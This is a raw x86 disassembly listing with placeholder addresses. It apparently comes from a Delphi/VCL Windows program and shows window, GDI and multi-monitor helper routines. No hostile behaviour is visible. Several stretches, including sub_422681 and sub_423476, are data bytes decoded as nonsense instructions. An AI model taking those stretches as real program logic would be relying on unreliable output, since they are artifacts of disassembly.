mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_422228
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202b4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_422307
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_42087c
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_41d610
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_41d4f4
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_4125c0
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_41d898
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41db74
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_420538
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422328
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42215c
xor eax eax
push ebp
push sub_422373
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42237a
mov eax [ ebp - 0x4 ]
call sub_422168
retn
mov esp ebp
pop ebp
retn
sub_42237a
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_4030f8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42215c
xor eax eax
push ebp
push sub_422373
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42237a
mov eax [ ebp - 0x4 ]
call sub_422168
retn
mov esp ebp
pop ebp
retn
sub_4223a0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41c868
push eax
mov eax ebx
call sub_41c868
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_422174
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_4223d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4224a1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4224a8
retn
mov eax [ rw-data ]
call sub_4030f8
mov eax [ rw-data ]
call sub_4030f8
mov eax [ rw-data ]
call sub_4030f8
call sub_41f4f0
mov eax [ rw-data ]
call sub_4030f8
mov eax [ rw-data ]
call sub_4030f8
mov eax [ rw-data ]
call sub_4030f8
mov eax [ rw-data ]
call sub_4030f8
mov eax [ rw-data ]
call sub_4030f8
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404930
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404930
sub_4224ac
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_421fb0
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_42202c
mov cx 0x2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c020
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c020
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c020
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220f8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413c9c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413c9c
mov [ rw-data ] eax
mov ecx sub_41c878
mov edx sub_41c888
mov eax [ sub_41b2e8 ]
call sub_4133bc
mov ecx r-xdata
mov edx sub_41ca90
mov eax [ r-xdata ]
call sub_4133bc
sub_4225b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4225dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4225e4
retn
sub_422681
and eax 0x33280042
inc eax
add [ ebx + esi ] dh
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] bl
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x28004010 ] ah
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
lodsb [ esi ]
sub al [ edx ]
sub al 0x29
inc eax
add al dh
sub al [ edx ]
fsubr [ edx ]
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
inc edx
add [ edx + edi ] bl
inc ecx
add al ah
sub [ edx ] eax
int3
push esp
push ebx
je r-xdata
jb r-xdata
ror [ ebx + 0x8d6e8c6 ] cl
arpl [ ebx - 0x70 ] bp
dec esp
imul esi [ ebx + 0x74 ] 0x7800408d
daa
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x80042 ] al
add [ eax ] al
les esp [ esi ]
inc edx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
lodsb [ esi ]
sub al [ edx ]
adc [ ebx ] ch
inc edx
add al dh
sub al [ edx ]
fsubr [ edx ]
inc edx
add [ esi ] al
sub_422794
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c8
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_4227d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_4030c8
mov [ esi + 0x10 ] bl
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_42284c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_413c98
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_4030f8
sub_422978
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413878
mov eax [ esi + 0x14 ]
call sub_4030f8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_4229e0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax ebx
sub al 0x1
jb r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419cdc
mov ebp eax
mov [ edi + 0x14 ] ebp
mov [ ebp + 0x34 ] edi
mov [ ebp + 0x30 ] sub_4229d0
test esi esi
je r-xdata
sub al 0x2
jb r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_42284c
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ edi + 0x14 ]
mov eax esi
call sub_419dac
jmp r-xdata
test esi esi
je r-xdata
jmp r-xdata
mov edx [ edi + 0x14 ]
mov eax esi
call sub_419fdc
sub_422a68
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_422aac
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_422af0
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_4138e4
mov eax esi
pop esi
pop ebx
retn
sub_422b1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_422b41
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422b48
retn
sub_422c10
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_422c35
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422c3c
retn
sub_422c48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404364
xor eax eax
push ebp
push sub_422d07
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422d0e
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404374
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_422c48
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403eb4
sub_422d30
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_422c48
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_422db8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_422c48
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_422e48
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_422c48
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_422db8
sub_422ede
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_422c48
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_422f5f
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_422c48
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42304c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_422c48
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_423120
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_422c48
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_4231f4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_422c48
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42338f
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4233b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4233bc
retn
sub_4233d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4233f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4233fc
retn
sub_423476
inc edx
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
insd
dec eax
insb
jo r-xdata
adc al 0x11
inc eax
add [ ecx ] al
xchg bx ax
xor al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004235 ] dh
add [ eax ] al
outsb
je r-xdata
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11147265
inc eax
add [ ecx ] al
xchg ebx eax
cld
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc eax
add [ eax + esi + 0x30e80040 ] ch
inc eax
add [ esi ] cl
jns r-xdata
add [ ebp * 2 + 0x33280040 ] dl
inc eax
add [ ebx + esi ] dh
jae r-xdata
xor eax 0xc0f0042
dec ecx
outsb
je r-xdata
jns r-xdata
cmp cl [ ecx ]
dec eax
insb
dec ecx
imul esp [ ebp + 0x77 ] 0x34b07265
inc edx
add [ ecx ] al
xchg bx ax
cld
xor [ eax ] al
call 0x144275e1
inc ebp
dec eax
insb
jo r-xdata
inc eax
add [ eax - 0x53ffbfd0 ] dl
outsb
je r-xdata
jo r-xdata
or [ eax + 0x65 ] ecx
insb
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x423530c0 ]
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor eax 0xc0042
add [ eax ] al
adc al 0x6d
inc eax
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
popad
outsb
popad
jb r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
insb
je r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esp + esi + 0x42 ] dh
imul ebp [ edi + 0x6e ] 0x1400408d
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
inc edx
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0x28004010 ]
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0xe427645
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42419b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
add [ eax + eax ] al
inc edx
insd
inc ebp
js r-xdata
jo r-xdata
or [ eax + 0x65 ] ecx
insb
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
adc [ eax ] eax
add [ esi - 0x6d ] esp
xor al 0x42
add bh bh
push eax
lodsd [ esi ]
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
imul esp [ ebp + 0x77 ] 0x34747265
inc edx
adc ecx [ ecx + 0x45 ]
insd
adc al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
lea eax [ eax ]
mov al 0x35
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp + 0x35b00040 ]
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403f08
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
add [ edi ] cl
or al 0x49
inc edx
jo r-xdata
outsb
dec eax
insb
jo r-xdata
cmp cl [ ecx ]
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x4234b4c0 ]
add [ edi ] cl
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
jmp r-xdata
int3
mov eax eax
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
adc al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
outsb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241a2
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404930
lea eax [ ebp - 0x8 ]
call sub_4054f0
retn
inc ebx
xor edi edi
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4233fc
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jns r-xdata
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405534
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
outsd
outsb
je r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
mov edx edi
mov eax [ esi + 0x14 ]
call sub_422828
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405508
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405534
mov eax [ ebp - 0xc ]
